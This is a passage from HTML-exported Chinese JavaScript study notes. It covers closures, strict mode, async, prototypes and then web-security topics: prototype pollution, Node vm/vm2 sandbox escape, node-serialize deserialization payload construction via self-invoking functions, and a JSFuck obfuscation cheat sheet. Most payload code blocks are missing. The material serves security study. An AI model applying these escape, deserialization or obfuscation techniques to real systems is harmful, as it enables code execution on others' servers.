class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>24</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">Counter</span><span class="cm-operator">=</span>(<span class="cm-keyword">function</span>(){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">var</span> <span class="cm-def">privateCounter</span><span class="cm-operator">=</span><span class="cm-number">0</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">changeBy</span>(<span class="cm-def">val</span>){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">privateCounter</span><span class="cm-operator">+=</span><span class="cm-variable-2">val</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">return</span> {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-property">increment</span>: <span class="cm-keyword">function</span>(){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">changeBy</span>(<span class="cm-number">1</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-property">decrement</span>:<span class="cm-keyword">function</span>(){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">changeBy</span>(<span class="cm-operator">-</span><span class="cm-number">1</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-property">value</span>:<span class="cm-keyword">function</span>(){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable-2">privateCounter</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">})();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable">Counter</span>.<span class="cm-property">value</span>());<span class="cm-comment">/*logs0*/</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Counter</span>.<span class="cm-property">increment</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Counter</span>.<span class="cm-property">increment</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable">Counter</span>.<span class="cm-property">value</span>());<span class="cm-comment">/*logs2*/</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Counter</span>.<span class="cm-property">decrement</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-variable">Counter</span>.<span class="cm-property">value</span>());<span class="cm-comment">/*logs1*/</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 544px;"></div><div class="CodeMirror-gutters" style="height: 544px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h4 id='全局对象'><span>全局对象</span></h4><p><span>全局对象是一个特殊的对象，它的作用域是全局的。</span></p><p><span>全平台可用的全局对象是 globalThis ，它跟全局作用域里的 this 值相同。另外在浏览器中存在 self 和window 全局对象，Web Workers 中存在 self 全局对象，Node.js 中存在 global 全局对象。</span></p><h3 id='严格模式'><span>严格模式</span></h3><h4 id='简介-30'><span>简介</span></h4><p><span>在 ES5 中，除了正常的运行模式之外，添加了严格模式（strict mode），这种模式使得代码显式地脱离</span>“<span>马虎模式/稀松模式/懒散模式</span>”<span>（sloppy）模式在更严格的条件下运行。</span><strong><span>严格模式不仅仅是一个子集：它的产生是为了形成与正常代码不同的语义</span></strong><span>。</span></p><p><span>引入严格模式的目的主要是：</span></p><ul><li><span>通过抛出错误来消除了一些原有静默错误</span></li><li><span>消除 JavaScript 语法的一些不合理、不严谨之处，减少一些怪异行为</span></li><li><span>消除代码运行的一些不安全之处，保证代码运行的安全</span></li><li><span>修复了一些导致 JavaScript 引擎难以执行优化的缺陷，提高编译器效率，增加运行速度</span></li><li><span>禁用了在 ECMAScript 的未来版本中可能会定义的一些语法，为未来新版本的 JavaScript 做铺垫</span></li></ul><h4 id='调用'><span>调用</span></h4><p><span>严格模式使用 </span><span>&quot;</span><span>use strict</span><span>&quot;</span><span>; 字符串开启。对整个脚本文件而言，可以将 </span><span>&quot;</span><span>use strict</span><span>&quot;</span><span> 放在脚本文件的第一行使整个脚本以严格模式运行。如果这行语句不在第一行则不会生效，会以正常模式运行。</span></p><p><span>对单个函数而言，将 </span><span>&quot;</span><span>use strict</span><span>&quot;</span><span> 放在函数体的第一行，则整个函数以严格模式运行。</span></p><h4 id='行为改变'><span>行为改变</span></h4><p><span>在严格模式中，主要有以下的行为更改：</span></p><h5 id='1-全局变量显式声明'><span>1. 全局变量显式声明</span></h5><p><span>在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"usestrict"</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">for</span>(<span class="cm-variable">i</span><span class="cm-operator">=</span><span class="cm-number">0</span>;<span class="cm-variable">i</span><span class="cm-operator">&lt;</span><span class="cm-number">2</span>;<span class="cm-variable">i</span><span class="cm-operator">++</span>){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">//ReferenceError:iisnotdefined</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h5 id='2-禁止使用-with-语句'><span>2. 禁止使用 with 语句</span></h5><p><span>with 语句无法在编译时就确定，属性到底归属哪个对象，这会影响编译效率，所以在严格模式中被禁止。</span></p><h5 id='3-创设-eval-作用域'><span>3. 创设 eval 作用域</span></h5><p><span>正常模式下，eval 语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval 语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于 eval 内部。</span></p><h5 id='4-禁止删除变量'><span>4. 禁止删除变量</span></h5><p><span>严格模式下无法删除变量。只有 configurable 设置为 true 的对象属性，才能被删除。</span></p><h5 id='5-显式报错'><span>5. 显式报错</span></h5><p><span>正常模式下一些错误只会默默地失败，但是严格模式下将会报错，包括以下几种场景：</span></p><ul><li><span>对一个对象的只读属性进行赋值</span></li><li><span>对一个使用 getter 方法读取的属性进行赋值</span></li><li><span>对禁止扩展的对象添加新属性</span></li><li><span>删除一个不可删除的属性</span></li></ul><h5 id='6-语法错误'><span>6. 语法错误</span></h5><p><span>严格模式新增了一些语法错误，包括：</span></p><ul><li><p><span>对象不能有重名的属性</span></p></li><li><p><span>函数不能有重名的参数</span></p></li><li><p><span>禁止八进制表示法</span></p></li><li><p><span>函数必须声明在顶层</span></p></li><li><h5 id='新增保留字'><span>新增保留字</span></h5><ul><li><span>class</span></li><li><span>enum</span></li><li><span>export</span></li><li><span>extends</span></li><li><span>import</span></li><li><span>super</span></li></ul></li></ul><h5 id='7-安全增强'><span>7. 安全增强</span></h5><ul><li><span>禁止 this 关键字指向全局对象</span></li><li><span>禁止在函数内部遍历调用栈</span></li></ul><h5 id='8-限制-arguments-对象'><span>8. 限制 arguments 对象</span></h5><ul><li><span>不允许对 arguments 赋值</span></li><li><span>arguments 不再追踪参数的变化</span></li><li><span>禁止使用 arguments.callee</span></li></ul><p>&nbsp;</p><h3 id='异步机制'><span>异步机制</span></h3><h4 id='async--await'><span>async / await</span></h4><p><span>async function 关键字用来在表达式中定义异步函数。</span></p><h4 id='promise'><span>Promise</span></h4><p><span>Promise 对象是一个代理对象（代理一个值），被代理的值在 Promise 对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的 promise 对象</span></p><p><span>一个 Promise 有以下几种状态:</span></p><ul><li><span>pending: 初始状态，既不是成功，也不是失败状态。</span></li><li><span>fulfilled: 意味着操作成功完成。</span></li><li><span>rejected: 意味着操作失败。</span></li></ul><p><span>pending 状态的 Promise 对象可能会变为 fulfilled 状态并传递一个值给相应的状态处理方法，也可能变为失败状态（rejected）并传递失败信息。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers ）就会被调用（then 方法包含两个参数：onfulfilled 和 onrejected，它们都是 Function 类型。当 Promise 状态为 fulfilled 时，调用 then 的 onfulfilled 方法，当 Promise 状态为 rejected 时，调用 then 的 onrejected 方法，所以在异步操作的完成和绑定处理方法之间不存在竞争）。</span></p><p><span>因为 Promise.prototype.then 和 Promise.prototype.catch 方法返回 promise 对象，所以它们可以被链式调用。</span></p><h4 id='执行队列'><span>执行队列</span></h4><p><span>JavaScript 中的异步运行机制如下：</span></p><ul><li><span>所有同步任务都在主线程上执行，形成一个执行栈</span></li><li><span>主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。</span></li><li><span>一旦执行栈中的所有同步任务执行完毕，系统就会读取任务队列，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。</span></li><li><span>主线程不断重复上面的第三步。</span></li></ul><p><span>其中浏览器的内核是多线程的，在浏览器的内核中不同的异步操作由不同的浏览器内核模块调度执行，异步操作会将相关回调添加到任务队列中。可以分为 </span><strong><span>DOM 事件、时间回调、网络回调</span></strong><span>三种：</span></p><ul><li><span>DOM 事件：由浏览器内核的 DOM 模块来处理，当事件触发的时候，回调函数会被添加到任务队列中。</span></li><li><span>时间回调：setTimeout / setInterval 等函数会由浏览器内核的 timer 模块来进行延时处理，当时间到达的时候，将回调函数添加到任务队列中。</span></li><li><span>网络回调：ajax / fetch 等则由浏览器内核的 network 模块来处理，在网络请求完成返回之后，才将回调添加到任务队列中。</span></li></ul><h3 id='原型链'><span>原型链</span></h3><h4 id='显式原型和隐式原型'><span>显式原型和隐式原型</span></h4><p><span>JavaScript 的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。</span></p><p><span>其中显式原型指 prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性。</span></p><p><span>隐式原型指 JavaScript 中任意对象都有的内置属性 prototype。在 ES5 之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过 、</span><span>_</span><span>_</span><span>proto__ 来访问。ES5 中有了对于这个内置属性标准的 Get 方法 Object.getPrototypeOf() 。隐式原型指向创建这个对象的函数 (constructor) 的 prototype， </span><span>_</span><span>_</span><span>proto__ 指向的是当前对象的原型对象，而 prototype 指向的，是以当前函数作为构造函数构造出来的对象的原型对象。</span></p><p><span>显式原型的作用用来实现基于原型的继承与属性的共享。隐式原型的用于构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问 obj 这个对象中的 x 属性时，如果在 obj 中找不到，那么就会沿着</span><span>_</span><span>_</span><span>proto__ 依次查找。</span></p><h4 id='new-的过程'><span>new 的过程</span></h4><p><span>new 的过程拆分成以下三步：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">p</span><span class="cm-operator">=</span>{}; <span class="cm-comment">//初始化一个对象 p </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">p</span>. <span class="cm-property">__proto__</span> <span class="cm-operator">=</span> <span class="cm-variable">Person</span>.<span class="cm-property">prototype</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Person</span>.<span class="cm-property">call</span>(<span class="cm-variable">p</span>); <span class="cm-comment">//构造 p，也可以称之为初始化 p</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>关键在于第二步，我们来证明一下：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">Person</span><span class="cm-operator">=</span><span class="cm-keyword">function</span>(){};</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">p</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-variable">Person</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">alert</span>(<span class="cm-variable">p</span>.<span class="cm-property">__proto__</span><span class="cm-operator">===</span><span class="cm-variable">Person</span>.<span class="cm-property">prototype</span>);</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>这段代码会返回 true。说明我们步骤 2 是正确的。</span></p><h4 id='示例'><span>示例</span></h4><blockquote><p><span>p 是一个引用指向 Person 的对象。我们在 Person 的原型上定义了一个 sayName 方法和 age 属性，当我们执行 p.age 时，会先在 this 的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。</span></p><p><span>这里的向上追溯是怎么向上的呢？这里就要使用 proto 属性来链接到原型（也就是 Person.prototype）进行查找。最终在原型上找到了 age 属性。</span></p></blockquote><h4 id='原型链污染'><span>原型链污染</span></h4><blockquote><p><span>如前文提到的，JavaScript 是动态继承，通过 proto 修改自身对象时会影响到有相同原型的对象。因此当键值对是用户可控的情况下，就可能出现原型链污染。</span></p></blockquote><h3 id='沙箱逃逸'><span>沙箱逃逸</span></h3><h4 id='前端沙箱'><span>前端沙箱</span></h4><blockquote><p><span>在前端中，可能会使用删除 eval ，重写 Function.prototype.constructor / GeneratorFunction / AsyncFunction 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新 iframe 的方式来获取新的执行环境。</span></p></blockquote><h4 id='服务端沙箱'><span>服务端沙箱</span></h4><blockquote><p><span>JavaScript 提供了原生的 vm 模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的</span></p><p><span>JavaScript API 和全局的 NodeJS 环境。 在原生的沙箱模块中，常用的逃逸方式为：</span></p><p><span>考虑到 JavaScript 原生 vm 模块的缺陷，有开发者设计了 vm2 来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：</span></p></blockquote><h3 id='反序列化-8'><span>反序列化</span></h3><h4 id='简介-31'><span>简介</span></h4><blockquote><p><span>JavaScript 本身并没有反序列化的实现，但是一些库如 node-serialize、serialize-to-js 等支持了反序列化功能。这些库通常使用 JSON 形式来存储数据，但是和原生函数 JSON.parse、JSON.stringify 不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。</span></p></blockquote><h4 id='payload-构造'><span>Payload 构造</span></h4><blockquote><p><span>下面是一个最简单的例子，首先获得序列化后的输出</span></p><p><span>上面执行后会返回</span></p><p><span>不过这段 payload 反序列化后并不会执行，但是在 JS 中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如 (function () { /</span><span>*</span><span> code </span><span>*</span><span>/ } ()); 这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的 payload 测试如下:</span></p></blockquote><h4 id='payload-构造-ii'><span>Payload 构造 II</span></h4><blockquote><p><span>以上提到的是 node-serialize 这类反序列化库的构造方式，还有一类库如 funcster，是使用直接拼接字符串构造函数的方式来执行。</span></p><p><span>这种方式可以使用相应的闭合来构造 payload。</span></p></blockquote><h3 id='jsfuck-cheat-sheet'><span>jsfuck cheat sheet</span></h3><h4 id='basic-values'><span>Basic values</span></h4><ul><li><span>undefined </span><span>&gt;</span><span> </span><span>[</span><span>]</span><span>[</span><span>[</span><span>]</span><span>]</span></li><li><span>false </span><span>&gt;</span><span> !</span><span>[</span><span>]</span></li><li><span>true </span><span>&gt;</span><span> !!</span><span>[</span><span>]</span></li><li><span>NaN </span><span>&gt;</span><span> +</span><span>[</span><span>!</span><span>[</span><span>]</span><span>]</span></li><li><span>0 </span><span>&gt;</span><span> +</span><span>[</span><span>]</span></li><li><span>1 </span><span>&gt;</span><span> +!+</span><span>[</span><span>]</span></li><li><span>2 </span><span>&gt;</span><span> !+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span></li></ul><h4 id='basic-strings'><span>Basic strings</span></h4><ul><li><span>&#39;</span><span>&#39;</span><span> </span><span>&gt;</span><span> 